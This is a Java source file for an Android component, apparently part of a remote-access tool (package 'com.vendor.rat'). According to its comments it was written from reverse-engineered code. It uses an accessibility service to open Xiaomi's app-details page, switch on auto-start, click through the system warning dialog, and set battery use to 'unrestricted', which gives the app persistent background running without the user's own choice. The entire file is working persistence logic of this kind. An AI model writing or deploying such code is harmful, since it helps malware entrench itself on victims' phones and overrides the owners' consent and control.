package com.vendor.rat.auto.engine.vendor;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.service.MyAccessibilityService;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * 小米厂商适配引擎 (模块 03)
 *
 * 基于逆向分析: o/q.java (498 行)
 *
 * 真机验证 (小米13, HyperOS 2.0, API 35):
 *   MIUI 应用详情页包含"自启动" Switch 和"电量消耗"栏目，
 *   在详情页开启自启动后，自启动管理页面自动同步 (同一数据源)。
 *   因此所有操作在应用详情页 (ApplicationsDetailsActivity) 一站完成:
 *     1. 滚动查找"自启动" Switch → 点击开启 → 处理确认对话框
 *     2. 滚动查找"电量消耗" → 点击 → 选择"无限制"
 *     3. 完成 → finish()
 *
 * 适配:
 *   - 自启动 (在应用详情页直接开启)
 *   - 电池优化 (com.miui.powerkeeper)
 *
 * 市场份额: ~30%
 */
public class XiaomiEngine extends AutoEngine {

    private static final String TAG = "XiaomiEngine";

    // 小米包名
    private static final String SECURITY_CENTER = "com.miui.securitycenter";
    private static final String POWER_KEEPER = "com.miui.powerkeeper";

    // 小米 Activity
    private static final String APP_DETAILS_ACTIVITY =
        "com.miui.appmanager.ApplicationsDetailsActivity";
    private static final String APP_MANAGER_MAIN_ACTIVITY =
        "com.miui.appmanager.AppManagerMainActivity";
    private static final String HIDDEN_APPS_CONFIG_ACTIVITY =
        "com.miui.powerkeeper.ui.HiddenAppsConfigActivity";
    private static final String POWER_DETAIL_ACTIVITY =
        "com.miui.powercenter.legacypowerrank.PowerDetailActivity";
    private static final String ALERT_DIALOG = "miuix.appcompat.app.AlertDialog";
    private static final String SETTINGS = "com.android.settings";

    // 状态常量
    private static final String ST_APP_DETAIL = "keepAliveInAppDetail";

    // 保活类型
    private static final String KA_UNKNOWN = "KEEP_ALIVE_UNKNOWN";
    private static final String KA_MAIN = "KEEP_ALIVE_MAIN_APP";

    // 延迟常量 (T0 单位: 1=200ms)
    private static final int DELAY_PAGE_RENDER = 2;
    private static final int DELAY_DIALOG_CLOSE = 3;

    // 状态字段
    private final AtomicReference<String> keepAliveType = new AtomicReference<>(KA_UNKNOWN);
    private final AtomicBoolean mainAutoStart = new AtomicBoolean(false);
    private final AtomicBoolean mainBackground = new AtomicBoolean(false);

    // 处理中标志
    private final AtomicBoolean processing = new AtomicBoolean(false);

    // 应用名称 (缓存, 从 PackageManager 解析)
    private String appName;

    // 窗口检测分组
    private final List<WindowMatcher> appDetailWins = new ArrayList<>();
    private final List<WindowMatcher> powerDetailWins = new ArrayList<>();

    public XiaomiEngine() {
        super(buildWindowMatchers(), SECURITY_CENTER);
        buildDetectionGroups();

        // 安全超时: 100 秒后检查 — 如果都已完成则结束引擎
        try {
            scheduler.schedule(new Runnable() {
                @Override
                public void run() {
                    checkAndFinish();
                }
            }, 100L, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "Schedule failed", e);
        }
    }

    private void buildDetectionGroups() {
        // App详情: ApplicationsDetailsActivity / AppManagerMainActivity / FrameLayout
        appDetailWins.add(new WindowMatcher(SECURITY_CENTER, APP_DETAILS_ACTIVITY));
        appDetailWins.add(new WindowMatcher(SECURITY_CENTER, APP_MANAGER_MAIN_ACTIVITY));
        appDetailWins.add(new WindowMatcher(SECURITY_CENTER, "android.widget.FrameLayout"));

        // 省电策略详情
        powerDetailWins.add(new WindowMatcher(POWER_KEEPER, HIDDEN_APPS_CONFIG_ACTIVITY));
        powerDetailWins.add(new WindowMatcher(SECURITY_CENTER, POWER_DETAIL_ACTIVITY));
    }

    private static List<WindowMatcher> buildWindowMatchers() {
        List<WindowMatcher> list = new ArrayList<>();

        // 电池优化对话框
        list.add(new WindowMatcher(SETTINGS, "android.app.Dialog")
            .addEventType(32).addEventType(16384));

        // App详情
        list.add(new WindowMatcher(SECURITY_CENTER, APP_DETAILS_ACTIVITY)
            .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SECURITY_CENTER, APP_MANAGER_MAIN_ACTIVITY)
            .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SECURITY_CENTER, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));

        // 省电策略配置
        list.add(new WindowMatcher(POWER_KEEPER, HIDDEN_APPS_CONFIG_ACTIVITY)
            .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SECURITY_CENTER, POWER_DETAIL_ACTIVITY)
            .addEventType(32).addEventType(16384));

        // MIUI AlertDialog (自启动确认 / 电池优化确认)
        list.add(new WindowMatcher(POWER_KEEPER, ALERT_DIALOG)
            .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SECURITY_CENTER, ALERT_DIALOG)
            .addEventType(32).addEventType(16384));

        return list;
    }

    // ============ 窗口检测 ============

    /** App详情窗口 */
    private boolean isAppDetailPage() { return matchesAny(appDetailWins); }

    /** 省电策略窗口 */
    private boolean isPowerDetailPage() { return matchesAny(powerDetailWins); }

    // ============ 事件处理 ============

    @Override
    protected void onEventSafe(AccessibilityEvent event, String packageName,
                                String className) {
        // 处理电池优化系统对话框
        if (event != null) {
            checkBatteryOptimizationDialog();
        }

        if (processing.get()) return;

        // 匹配小米安全中心页面 (ApplicationsDetailsActivity 或 FrameLayout)
        // FrameLayout 是 MIUI 容器，Activity 已在前台时只触发 FrameLayout 事件
        if (SECURITY_CENTER.equals(packageName) && className != null
                && (className.contains("ApplicationsDetailsActivity")
                    || className.contains("FrameLayout")
                    || className.contains("AppManager"))) {
            dispatchState(ST_APP_DETAIL, this::handleAppDetailPage);
        }
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // 由 onAccessibilityEvent 处理
    }

    @Override
    public void execute() {
        // 由外部打开应用详情页触发
    }

    // ============ 应用详情页处理 (一站完成) ============

    /**
     * 在应用详情页完成所有操作:
     *   Step 1: 自启动 Switch
     *   Step 2: 电量消耗 → 无限制
     *   Step 3: finish
     */
    private void handleAppDetailPage() {
        processing.set(true);
        keepAliveType.set(KA_MAIN);

        // 验证确实在应用详情页 (避免 FrameLayout 误触发其他 securitycenter 页面)
        T0(DELAY_PAGE_RENDER);  // 等待页面渲染
        UiNode root = getRootNode();
        if (root == null) {
            Log.d(TAG, "root 为空，等待重试");
            processing.set(false);
            stateQueue.remove(ST_APP_DETAIL);
            return;
        }
        // 应用详情页应含有 "自启动" 或 "电量消耗" 或 "应用信息"
        boolean isDetailPage = root.findOneByTextContains("应用信息") != null
                || root.findOneByDescContains("自启动") != null
                || root.findOneByTextContains("电量消耗") != null
                || root.findOneByTextContains("存储占用") != null;
        if (!isDetailPage) {
            Log.d(TAG, "当前页面不是应用详情页，跳过");
            processing.set(false);
            stateQueue.remove(ST_APP_DETAIL);
            return;
        }
        Log.d(TAG, "确认在应用详情页，开始处理");

        updateProgress(5);

        // Step 1: 处理自启动
        if (!mainAutoStart.get()) {
            handleAutoStartInDetail();
            // 对话框关闭后等待页面恢复
            T0(DELAY_DIALOG_CLOSE);
        }

        // Step 2: 处理电池优化
        if (!mainBackground.get()) {
            handleBatteryInDetail();
        }

        // Step 3: 完成
        processing.set(false);
        checkAndFinish();
    }

    /**
     * Step 1: 在应用详情页找到"自启动" Switch 并开启
     *
     * MIUI UI 结构 (真机验证):
     *   Switch[content-desc="自启动", checkable=true, checked=false/true]
     *     ├── ImageView (icon)
     *     ├── TextView[text="自启动"]
     *     └── Switch[id=android:id/checkbox] (实际开关)
     */
    private void handleAutoStartInDetail() {
        try {
            updateProgress(10);
            UiNode root = getRootNode();
            if (root == null) return;

            // 查找 content-desc="自启动" 的 Switch
            UiNode autoStartSwitch = root.findOneByDescContains("自启动");

            if (autoStartSwitch == null) {
                // 可能需要滚动
                UiNode scrollView = getScrollableNode();
                if (scrollView != null) {
                    autoStartSwitch = scrollView.scrollForwardUntil(
                        n -> n.desc() != null && n.desc().contains("自启动"));
                    if (autoStartSwitch == null) {
                        autoStartSwitch = scrollView.scrollBackwardUntil(
                            n -> n.desc() != null && n.desc().contains("自启动"));
                    }
                }
            }

            if (autoStartSwitch == null) {
                // fallback: 通过 title text 查找
                UiNode textNode = root.findOneByText("自启动");
                if (textNode != null) {
                    autoStartSwitch = textNode.findClickableParent();
                }
            }

            if (autoStartSwitch == null) {
                Log.e(TAG, "自启动 Switch 未找到");
                return;
            }

            // 检查是否已开启
            if (autoStartSwitch.isChecked()) {
                Log.d(TAG, "自启动已开启，跳过");
                mainAutoStart.set(true);
                updateProgress(30);
                return;
            }

            // 点击开启
            autoStartSwitch.click();
            Log.d(TAG, "已点击自启动 Switch");
            updateProgress(20);

            // 等待并处理确认对话框 ("知道了" 按钮)
            T0(2);
            handleAutoStartDialog();

            mainAutoStart.set(true);
            updateProgress(30);
            Log.d(TAG, "自启动已开启");
        } catch (Exception e) {
            logError("handleAutoStartInDetail", e);
        }
    }

    /**
     * 处理自启动确认对话框
     * MIUI 弹窗: "开启自启动可能增加应用内存占用和耗电..." → "知道了"
     */
    private void handleAutoStartDialog() {
        try {
            UiNode root = getRootNode();
            if (root == null) return;

            // 查找"知道了"按钮
            UiNode btn = root.findOneByText("知道了");
            if (btn == null) {
                btn = root.findOneByTextContains("知道");
            }
            if (btn == null) {
                // 可能是"确定"或"OK"
                btn = root.findOneByText("确定");
            }

            if (btn != null && btn.isClickable()) {
                btn.click();
                Log.d(TAG, "已点击自启动确认对话框");
                T0(1);
            } else {
                // 没有对话框 (可能 MIUI 版本不同) — 不影响
                Log.d(TAG, "未检测到自启动确认对话框");
            }
        } catch (Exception e) {
            logError("handleAutoStartDialog", e);
        }
    }

    /**
     * Step 2: 在应用详情页找到"电量消耗"并设为"无限制"
     */
    private void handleBatteryInDetail() {
        try {
            updateProgress(40);

            // 刷新获取最新页面 (对话框关闭后可能需要)
            UiNode scrollView = getScrollableNode();
            UiNode target = null;

            CombineFilter powerSaving = buildPowerSavingFilter();
            CombineFilter powerConsume = buildPowerConsumeFilter();

            if (scrollView != null) {
                // 先滚到底部再向上找 — 电量消耗通常在中下位置
                scrollView.scrollForwardEnd();
                scrollView.refresh();
                if (powerConsume != null) {
                    target = scrollView.scrollBackwardUntil(powerConsume);
                }
                if (target == null && powerSaving != null) {
                    target = scrollView.scrollForwardUntil(powerSaving);
                }
            } else {
                // 直接在根节点查找
                UiNode root = getRootNode();
                if (root == null) return;
                if (powerConsume != null) {
                    target = root.findOneByCombine(powerConsume);
                }
                if (target == null && powerSaving != null) {
                    target = root.findOneByCombine(powerSaving);
                }
            }

            if (target != null) {
                Log.d(TAG, "耗电策略查找成功:" + target);
                updateProgress(50);
                UiNode clickableParent = target.findClickableParent();
                if (clickableParent != null && clickableParent.click()) {
                    Log.d(TAG, "已点击电量消耗栏目");
                    updateProgress(60);
                    // 等待省电策略页面出现 — 轮询查找"无限制"文本
                    // (不依赖 isPowerDetailPage() 窗口检测，因为事件时序不可靠)
                    T0(3);  // 等待页面切换动画
                    handlePowerDetailPage();
                } else {
                    Log.e(TAG, "电量消耗栏目点击失败");
                }
            } else {
                Log.e(TAG, "电量消耗栏目未找到");
            }
        } catch (Exception e) {
            logError("handleBatteryInDetail", e);
        }
    }

    // ============ 过滤器 ============

    private CombineFilter buildPowerSavingFilter() {
        return buildTextViewFilter("MIUI_SETTINGS_POWER_SAVING_STRATEGY_TEXT");
    }

    private CombineFilter buildPowerConsumeFilter() {
        return buildTextViewFilter("MIUI_APP_POWER_CONSUME_TEXT");
    }

    // ============ 省电策略详情页 ============

    /**
     * 选择"无限制"
     */
    private void handlePowerDetailPage() {
        try {
            // 轮询查找"无限制"(最多 10 次 * 1秒)
            for (int i = 0; i < 10; i++) {
                UiNode root = getRootNode();
                if (root == null) { T0(2); continue; }

                UiNode unlimited = root.findOneByTextContains("无限制");
                if (unlimited != null) {
                    unlimited.click();
                    Log.d(TAG, "已选择无限制");
                    mainBackground.set(true);
                    updateProgress(80);
                    T0(2);
                    performBack();
                    return;
                }
                Log.d(TAG, "等待无限制选项出现... (" + (i + 1) + "/10)");
                T0(2);
            }
            Log.e(TAG, "无限制选项未找到");
        } catch (Exception e) {
            logError("handlePowerDetailPage", e);
        }
    }

    // ============ 完成检查 ============

    private void checkAndFinish() {
        if (mainAutoStart.get() && mainBackground.get()) {
            Log.d(TAG, "自启动+电池优化均已完成");
            // 持久化完成状态，防止进程重启后重复触发
            com.vendor.rat.keepalive.thread.StrategyThread.markKeepAliveCompleted();
            finish();
        } else if (mainAutoStart.get()) {
            Log.d(TAG, "自启动已完成, 电池优化待处理");
        } else if (mainBackground.get()) {
            Log.d(TAG, "电池优化已完成, 自启动待处理");
        }
    }

    // ============ 状态保存 ============

    private void saveState() {
        Log.d(TAG, "保活策略: autoStart=" + mainAutoStart.get()
            + " background=" + mainBackground.get());
    }

    // ============ 结束引擎 ============

    @Override
    public void finish() {
        // 保存状态后委托给基类 (基类负责 removeWithDestroy → 触发权限请求)
        saveState();
        Log.d(TAG, "准备结束本地保活自动化引擎");
        super.finish();
        Log.d(TAG, "已结束本地保活自动化引擎");
    }

    // ============ 工具方法 ============

    private String getAppName() {
        if (appName != null) return appName;
        try {
            android.content.Context ctx = getContext();
            if (ctx != null) {
                android.content.pm.ApplicationInfo info = ctx.getPackageManager()
                    .getApplicationInfo(ctx.getPackageName(), 0);
                appName = ctx.getPackageManager().getApplicationLabel(info).toString();
                Log.d(TAG, "Resolved app name: " + appName);
                return appName;
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to resolve app name", e);
        }
        return "com.vendor.rat";
    }

    public void setAppName(String appName) {
        this.appName = appName;
    }
}
